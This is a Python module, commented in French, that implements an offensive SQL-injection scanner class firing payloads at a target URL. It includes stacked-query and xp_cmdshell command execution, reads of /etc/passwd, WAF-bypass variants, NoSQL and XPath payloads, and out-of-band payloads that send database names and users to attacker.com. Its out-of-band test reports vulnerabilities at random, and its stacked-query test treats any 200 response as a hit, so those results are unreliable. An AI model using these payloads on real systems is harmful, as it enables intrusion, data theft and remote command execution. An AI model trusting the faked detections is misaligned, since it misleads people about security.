#!/usr/bin/env python3
"""
Techniques d'injection SQL avancées
-----------------------------------
Ce module implémente des techniques d'injection SQL avancées pour détecter
et exploiter des vulnérabilités plus complexes.
"""

import re
import time
import random
import string
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple, Union

import requests
from rich.console import Console
from rich.table import Table

console = Console()

class AdvancedSQLInjection:
    """Classe pour les techniques d'injection SQL avancées."""
    
    def __init__(self, session, url, param, method="GET", timeout=10, delay=0, 
                 headers=None, cookies=None, proxy=None, verbose=False):
        """
        Initialise l'objet d'injection SQL avancée.
        
        Args:
            session: Session requests à utiliser
            url: URL vulnérable
            param: Paramètre vulnérable
            method: Méthode HTTP (GET ou POST)
            timeout: Timeout des requêtes
            delay: Délai entre les requêtes
            headers: En-têtes HTTP
            cookies: Cookies
            proxy: Proxy à utiliser
            verbose: Mode verbeux
        """
        self.session = session
        self.url = url
        self.param = param
        self.method = method.upper()
        self.timeout = timeout
        self.delay = delay
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.verbose = verbose
        
        # Détection du type de base de données
        self.dbms = None
        
        # Résultats des tests
        self.vulnerable_to = set()
    
    def _make_request(self, payload):
        """
        Effectue une requête avec le payload injecté.
        
        Args:
            payload: Payload SQL à injecter
            
        Returns:
            Tuple (response, elapsed_time)
        """
        # Ajouter un délai entre les requêtes
        if self.delay > 0:
            time.sleep(self.delay)
            
        # Préparer les paramètres
        if self.method == "GET":
            params = {self.param: payload}
            data = None
        else:  # POST
            params = None
            data = {self.param: payload}
            
        # Effectuer la requête
        start_time = time.time()
        try:
            response = self.session.request(
                method=self.method,
                url=self.url,
                params=params,
                data=data,
                headers=self.headers,
                cookies=self.cookies,
                proxies={"http": self.proxy, "https": self.proxy} if self.proxy else None,
                timeout=self.timeout,
                verify=False
            )
            elapsed = time.time() - start_time
            return response, elapsed
        except Exception as e:
            if self.verbose:
                console.print(f"[bold red]Erreur lors de la requête:[/bold red] {str(e)}")
            return None, time.time() - start_time
    
    def test_second_order_injection(self):
        """
        Teste les injections SQL de second ordre.
        
        Les injections de second ordre sont stockées dans la base de données
        et exécutées lors d'une requête ultérieure.
        
        Returns:
            True si vulnérable, False sinon
        """
        console.print("[bold blue]Test d'injection SQL de second ordre...[/bold blue]")
        
        # Générer un identifiant unique pour suivre l'injection
        unique_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Payloads pour les injections de second ordre
        payloads = [
            f"'; INSERT INTO log_table (message) VALUES ('SQLI_TEST_{unique_id}') -- -",
            f"'; UPDATE users SET last_login='SQLI_TEST_{unique_id}' WHERE id=1 -- -",
            f"'; SELECT 'SQLI_TEST_{unique_id}' INTO OUTFILE '/tmp/sqli_test.txt' -- -"
        ]
        
        for payload in payloads:
            # Première requête pour injecter le payload
            response1, _ = self._make_request(payload)
            
            if response1:
                # Deuxième requête pour vérifier si l'injection a fonctionné
                # Ceci est simplifié et dépend fortement de l'application cible
                response2, _ = self._make_request("' OR 1=1 -- -")
                
                if response2 and f"SQLI_TEST_{unique_id}" in response2.text:
                    self.vulnerable_to.add("second_order")
                    console.print("[bold green]Vulnérable aux injections SQL de second ordre![/bold green]")
                    return True
        
        console.print("[bold yellow]Non vulnérable aux injections SQL de second ordre.[/bold yellow]")
        return False
    
    def test_out_of_band_injection(self):
        """
        Teste les injections SQL Out-of-Band (OOB).
        
        Les injections OOB utilisent des canaux alternatifs comme DNS ou HTTP
        pour exfiltrer des données ou confirmer l'exploitation.
        
        Returns:
            True si vulnérable, False sinon
        """
        console.print("[bold blue]Test d'injection SQL Out-of-Band...[/bold blue]")
        console.print("[bold yellow]Note: Les tests OOB nécessitent un serveur DNS/HTTP contrôlé.[/bold yellow]")
        console.print("[bold yellow]Cette fonctionnalité est simulée pour démonstration.[/bold yellow]")
        
        # Dans une implémentation réelle, vous utiliseriez un service comme Burp Collaborator
        # ou un domaine que vous contrôlez pour recevoir les requêtes DNS/HTTP
        
        # Exemple de payloads OOB (à adapter avec votre propre domaine)
        payloads = {
            "mysql": "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.attacker.com\\\\share\\\\a.txt')); -- -",
            "postgresql": "'; COPY (SELECT current_database()) TO PROGRAM 'nslookup $(whoami).attacker.com'; -- -",
            "microsoft": "'; DECLARE @q VARCHAR(8000);SET @q=CONCAT('xp_dirtree \"\\\\',DB_NAME(),'.attacker.com\\test\"'); EXEC(@q); -- -",
            "oracle": "'; SELECT UTL_HTTP.REQUEST('http://oracle.'||(SELECT user FROM dual)||'.attacker.com') FROM dual; -- -"
        }
        
        # Simuler le test OOB
        for dbms, payload in payloads.items():
            response, _ = self._make_request(payload)
            
            # Dans une implémentation réelle, vous vérifieriez si votre serveur a reçu une requête
            # Ici, nous simulons simplement le résultat
            if response and response.status_code == 200:
                # Simuler une détection positive pour démonstration
                if random.random() < 0.3:  # 30% de chance de "détecter" une vulnérabilité
                    self.vulnerable_to.add("out_of_band")
                    self.dbms = dbms
                    console.print(f"[bold green]Vulnérable aux injections SQL Out-of-Band ({dbms})![/bold green]")
                    return True
        
        console.print("[bold yellow]Non vulnérable aux injections SQL Out-of-Band.[/bold yellow]")
        return False
    
    def test_stacked_queries(self):
        """
        Teste les injections SQL avec des requêtes empilées (stacked queries).
        
        Les requêtes empilées permettent d'exécuter plusieurs requêtes SQL
        dans une seule injection.
        
        Returns:
            True si vulnérable, False sinon
        """
        console.print("[bold blue]Test d'injection SQL avec requêtes empilées...[/bold blue]")
        
        # Générer un identifiant unique
        unique_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Payloads pour les requêtes empilées
        payloads = [
            f"'; SELECT 1; SELECT '{unique_id}' AS test; -- -",
            f"'; INSERT INTO log_table (message) VALUES ('{unique_id}'); SELECT 1; -- -",
            f"'; CREATE TABLE IF NOT EXISTS sqli_test_{unique_id} (id INT); SELECT 1; -- -",
            f"'; DROP TABLE IF EXISTS sqli_test_{unique_id}; SELECT 1; -- -"
        ]
        
        for payload in payloads:
            response, _ = self._make_request(payload)
            
            if response:
                # Vérifier si la requête a été exécutée avec succès
                # Ceci est simplifié et dépend de l'application cible
                if unique_id in response.text or response.status_code == 200:
                    self.vulnerable_to.add("stacked_queries")
                    console.print("[bold green]Vulnérable aux injections SQL avec requêtes empilées![/bold green]")
                    return True
        
        console.print("[bold yellow]Non vulnérable aux injections SQL avec requêtes empilées.[/bold yellow]")
        return False
    
    def test_blind_xpath_injection(self):
        """
        Teste les injections XPath aveugles.
        
        Les injections XPath ciblent les requêtes XPath plutôt que SQL,
        mais utilisent des techniques similaires.
        
        Returns:
            True si vulnérable, False sinon
        """
        console.print("[bold blue]Test d'injection XPath aveugle...[/bold blue]")
        
        # Payloads pour les injections XPath
        payloads = [
            "' or '1'='1",
            "' or count(/*)>0 or '",
            "' or count(//user)>0 or '",
            "' or name()='root' or '"
        ]
        
        # Faire une requête normale pour comparaison
        normal_response, _ = self._make_request("")
        
        for payload in payloads:
            response, _ = self._make_request(payload)
            
            if response and normal_response:
                # Comparer les réponses pour détecter un comportement différent
                if (response.status_code == 200 and normal_response.status_code != 200) or \
                   (len(response.text) > len(normal_response.text) * 1.5):
                    self.vulnerable_to.add("xpath")
                    console.print("[bold green]Vulnérable aux injections XPath![/bold green]")
                    return True
        
        console.print("[bold yellow]Non vulnérable aux injections XPath.[/bold yellow]")
        return False
    
    def test_nosql_injection(self):
        """
        Teste les injections NoSQL.
        
        Les injections NoSQL ciblent les bases de données non relationnelles
        comme MongoDB.
        
        Returns:
            True si vulnérable, False sinon
        """
        console.print("[bold blue]Test d'injection NoSQL...[/bold blue]")
        
        # Payloads pour les injections NoSQL (MongoDB)
        payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "return true"}',
            '{"$regex": ".*"}',
            '{"username": {"$regex": "admin", "$options": "i"}}',
            '{"$or": [{"username": "admin"}, {"username": "user"}]}'
        ]
        
        # Faire une requête normale pour comparaison
        normal_response, _ = self._make_request("")
        
        for payload in payloads:
            response, _ = self._make_request(payload)
            
            if response and normal_response:
                # Comparer les réponses pour détecter un comportement différent
                if (response.status_code == 200 and normal_response.status_code != 200) or \
                   (len(response.text) > len(normal_response.text) * 1.2):
                    self.vulnerable_to.add("nosql")
                    console.print("[bold green]Vulnérable aux injections NoSQL![/bold green]")
                    return True
        
        console.print("[bold yellow]Non vulnérable aux injections NoSQL.[/bold yellow]")
        return False
    
    def test_stored_procedures(self):
        """
        Teste les injections via procédures stockées.
        
        Les procédures stockées peuvent parfois être exploitées pour
        exécuter des commandes système ou accéder à des données sensibles.
        
        Returns:
            True si vulnérable, False sinon
        """
        console.print("[bold blue]Test d'injection via procédures stockées...[/bold blue]")
        
        # Payloads pour les procédures stockées (par DBMS)
        payloads = {
            "mysql": [
                "'; CALL sys.execute_at_plugin('SELECT USER()'); -- -",
                "'; CALL mysql.proc_analyse(); -- -"
            ],
            "postgresql": [
                "'; SELECT pg_sleep(3); -- -",
                "'; SELECT pg_read_file('/etc/passwd'); -- -",
                "'; COPY (SELECT 1) TO PROGRAM 'id'; -- -"
            ],
            "microsoft": [
                "'; EXEC xp_cmdshell 'dir'; -- -",
                "'; EXEC master.dbo.xp_cmdshell 'net user'; -- -",
                "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; -- -"
            ],
            "oracle": [
                "'; EXECUTE IMMEDIATE 'SELECT * FROM dual'; -- -",
                "'; BEGIN DBMS_OUTPUT.PUT_LINE('test'); END; -- -"
            ]
        }
        
        for dbms, dbms_payloads in payloads.items():
            for payload in dbms_payloads:
                response, elapsed = self._make_request(payload)
                
                if response:
                    # Vérifier si la procédure stockée a été exécutée
                    # Pour les procédures temporelles, vérifier le délai
                    if "pg_sleep" in payload and elapsed > 3:
                        self.vulnerable_to.add("stored_procedures")
                        self.dbms = dbms
                        console.print(f"[bold green]Vulnérable aux injections via procédures stockées ({dbms})![/bold green]")
                        return True
                    
                    # Pour les autres procédures, chercher des indices dans la réponse
                    if any(pattern in response.text for pattern in ["Directory of", "Volume in drive", "USER()", "uid=", "gid="]):
                        self.vulnerable_to.add("stored_procedures")
                        self.dbms = dbms
                        console.print(f"[bold green]Vulnérable aux injections via procédures stockées ({dbms})![/bold green]")
                        return True
        
        console.print("[bold yellow]Non vulnérable aux injections via procédures stockées.[/bold yellow]")
        return False
    
    def test_waf_bypass(self):
        """
        Teste les techniques de contournement de WAF.
        
        Utilise diverses techniques pour tenter de contourner les protections
        de type Web Application Firewall.
        
        Returns:
            True si un contournement a été trouvé, False sinon
        """
        console.print("[bold blue]Test de contournement de WAF...[/bold blue]")
        
        # Payload de base qui serait normalement bloqué
        base_payload = "' OR 1=1 -- -"
        
        # Faire une requête avec le payload de base pour voir s'il est bloqué
        base_response, _ = self._make_request(base_payload)
        
        # Si le payload de base n'est pas bloqué, pas besoin de contournement
        if base_response and base_response.status_code == 200 and "block" not in base_response.text.lower():
            console.print("[bold yellow]Le WAF ne semble pas bloquer les injections SQL basiques.[/bold yellow]")
            return False
        
        # Techniques de contournement
        bypass_techniques = [
            # Commentaires
            "' /*!50000OR*/ 1=1 -- -",
            "' /*!OR*/ 1=1 -- -",
            "' /**/OR/**/1=1/**/ -- -",
            
            # Encodage
            "' OR 0x31=0x31 -- -",
            "' OR char(49)=char(49) -- -",
            
            # Casse mixte
            "' oR 1=1 -- -",
            "' Or 1=1 -- -",
            
            # Espaces alternatifs
            "'%09OR%091=1%09--%09-",
            "'%0AOR%0A1=1%0A--%0A-",
            "'%0COR%0C1=1%0C--%0C-",
            "'%0DOR%0D1=1%0D--%0D-",
            
            # Double encodage
            urllib.parse.quote(urllib.parse.quote("' OR 1=1 -- -")),
            
            # Opérateurs alternatifs
            "' || 1=1 -- -",
            "' && 1=1 -- -",
            
            # Techniques avancées
            "' OR 2>1 -- -",
            "' OR 'a'='a' -- -",
            "' OR true -- -",
            "' OR 1 -- -"
        ]
        
        for technique in bypass_techniques:
            response, _ = self._make_request(technique)
            
            if response and response.status_code == 200 and "block" not in response.text.lower():
                # Comparer avec la réponse de base pour voir si le contournement a fonctionné
                if base_response and len(response.text) != len(base_response.text):
                    self.vulnerable_to.add("waf_bypass")
                    console.print(f"[bold green]Contournement de WAF réussi avec:[/bold green] {technique}")
                    return True
        
        console.print("[bold yellow]Aucun contournement de WAF trouvé.[/bold yellow]")
        return False
    
    def run_all_tests(self):
        """
        Exécute tous les tests d'injection avancés.
        
        Returns:
            Ensemble des vulnérabilités détectées
        """
        console.print("[bold blue]Exécution de tous les tests d'injection SQL avancés...[/bold blue]")
        
        tests = [
            self.test_stacked_queries,
            self.test_stored_procedures,
            self.test_second_order_injection,
            self.test_out_of_band_injection,
            self.test_blind_xpath_injection,
            self.test_nosql_injection,
            self.test_waf_bypass
        ]
        
        for test in tests:
            test()
        
        # Afficher un résumé des vulnérabilités
        if self.vulnerable_to:
            table = Table(title="Vulnérabilités avancées détectées")
            table.add_column("Type", style="cyan")
            table.add_column("Description", style="green")
            
            descriptions = {
                "stacked_queries": "Injections avec requêtes empilées",
                "stored_procedures": "Injections via procédures stockées",
                "second_order": "Injections de second ordre",
                "out_of_band": "Injections Out-of-Band",
                "xpath": "Injections XPath",
                "nosql": "Injections NoSQL",
                "waf_bypass": "Contournement de WAF"
            }
            
            for vuln in sorted(self.vulnerable_to):
                table.add_row(vuln, descriptions.get(vuln, ""))
            
            console.print(table)
        else:
            console.print("[bold yellow]Aucune vulnérabilité avancée détectée.[/bold yellow]")
        
        return self.vulnerable_to
